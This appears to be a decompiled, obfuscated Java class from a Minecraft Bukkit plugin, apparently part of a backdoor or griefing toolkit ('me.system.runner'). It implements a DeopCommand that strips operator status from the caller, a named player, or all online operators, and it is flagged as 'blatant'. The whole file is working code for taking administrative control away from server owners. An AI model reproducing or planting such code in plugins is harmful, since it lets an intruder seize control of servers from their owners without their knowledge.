/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class DeopCommand
extends Command {
    public DeopCommand() {
        DeopCommand lllllllllllllIllIllllllIlIlIIIlI;
    }

    @Override
    public void execute(Core lllllllllllllIllIllllllIlIIllIIl, String lllllllllllllIllIllllllIlIIllIII, String[] lllllllllllllIllIllllllIlIIlIlll, Player lllllllllllllIllIllllllIlIIlIllI) {
        if (lllllllllllllIllIllllllIlIIlIlll.length <= 1) {
            API.deopPlayer(lllllllllllllIllIllllllIlIIlIllI);
            lllllllllllllIllIllllllIlIIlIllI.sendMessage(Settings.PREFIX("You are no longer an operator"));
        } else if (lllllllllllllIllIllllllIlIIlIlll[1].equals("*")) {
            for (Player lllllllllllllIllIllllllIlIIlllII : Bukkit.getOnlinePlayers()) {
                if (!lllllllllllllIllIllllllIlIIlllII.isOp()) continue;
                API.deopPlayer(lllllllllllllIllIllllllIlIIlllII);
            }
            lllllllllllllIllIllllllIlIIlIllI.sendMessage(Settings.PREFIX("All online players are no longer operators"));
        } else {
            Player lllllllllllllIllIllllllIlIIllIll = Bukkit.getServer().getPlayer(lllllllllllllIllIllllllIlIIlIlll[1]);
            if (lllllllllllllIllIllllllIlIIllIll == null) {
                lllllllllllllIllIllllllIlIIlIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIllIllllllIlIIlIlll[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                API.deopPlayer(lllllllllllllIllIllllllIlIIllIll);
                lllllllllllllIllIllllllIlIIlIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIllIllllllIlIIllIll.getName()).append(Settings.WHITE).append(" is no longer an operator"))));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

